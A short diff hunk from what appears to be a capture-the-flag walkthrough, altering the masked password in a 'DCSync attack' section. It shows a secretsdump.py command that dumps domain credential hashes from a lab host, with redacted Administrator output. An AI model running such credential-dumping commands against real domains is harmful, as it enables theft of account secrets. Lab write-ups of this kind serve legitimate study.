@@ -145,7 +145,7 @@ DCSync attack
 >## secretsdump.py
 
 ```
-root@ubuntu:~# secretsdump.py vulnnet-rst.local/a-whitehat:******************@10.10.250.145
+root@ubuntu:~# secretsdump.py vulnnet-rst.local/a-whitehat:xxxxxxxx@10.10.250.145
 
 Administrator:c25xxxxxxx
 
